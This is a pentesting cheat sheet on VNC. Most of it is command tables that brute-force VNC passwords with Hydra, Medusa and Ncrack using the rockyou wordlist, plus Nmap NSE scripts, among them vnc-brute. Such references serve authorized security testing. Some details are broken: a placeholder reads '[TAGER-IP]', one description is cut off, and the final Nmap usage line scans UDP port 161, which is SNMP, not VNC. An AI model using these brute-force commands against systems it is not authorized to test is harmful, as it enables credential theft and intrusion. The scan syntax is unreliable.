### **Introduction**

VNC (Virtual Network Computing) is a desktop sharing system that uses the RFB (Remote Frame Buffer) protocol to control another computer remotely. It transmits keyboard and mouse inputs and updates the graphical screen between computers over a network. VNC is platform-independent, supporting various operating systems, and is commonly used for technical support and remote file access.

### **Connecting Using VNC Viewer**

| Command | Description |
| --- | --- |
| `vncviewer -passwd passwd.txt [TARGET-IP]::[PORT]` | Connects to a VNC server using an IP and port with password authentication from a specified file. |

### **Brute-Forcing VNC Credentials**

| Command | Description |
| --- | --- |
| `hydra -s 5900 -P /usr/share/wordlists/rockyou.txt -t 4 [TARGET-IP] vnc -V` | This command Uses Hydra to crack VNC server passwords on port 5900 using the "rockyou.txt" password list, with detailed output. |
| `hydra -s 5900 -L [PATH_TO_USERLIST] -P /usr/share/wordlists/rockyou.txt -t 4 [TAGER-IP] vnc -V` | This command uses Hydra to perform a brute force attack on a VNC server, using a list of usernames and passwords on port 5900, with detailed output enabled. |
| `medusa -h [TARGET-IP] -u [USERNAME] -P /usr/share/wordlists/rockyou.txt -M vnc -T 4 -v 4` | This command uses Medusa to test VNC server logins at a specific IP address, using one username, multiple passwords, |
| `ncrack -vv --user [USERNAME] -P /usr/share/wordlists/rockyou.txt vnc://[TARGET-IP]:5900` | This command runs Ncrack to attempt a password crack on a VNC server using a specified username and password list, with high detail in the output. |

### **Nmap**

| Command | Description |
| --- | --- |
| `ls -la /usr/share/nmap/scripts \| grep "vnc"` | Displays a list of Nmap NSE scripts that are specifically designed for auditing VNC services. This is a quick way to select scripts appropriate for targeted security checks. |
| `nmap -p 5900 --script vnc* [TARGET-IP]` | This Nmap command scans port 5900 for VNC vulnerabilities and config details at the given IP address. |

#### **Popular NSE Scripts for VNC**

Nmap Scripting Engine offers several scripts targeted at assessing VNC services. These scripts can help uncover potential security weaknesses:

| Script Name | Description |
| --- | --- |
| `vnc-info.nse` | Gathers extensive information about the VNC service, including the protocol version and security settings, to help in understanding how the server is configured. |
| `vnc-brute.nse` | Attempts to brute-force the password of a VNC server, providing insights into the robustness of the existing password policy. |
| *Usage* | `nmap [TARGET-IP] -Pn -sU -p 161 --script=[SCRIPT-NAME]` |
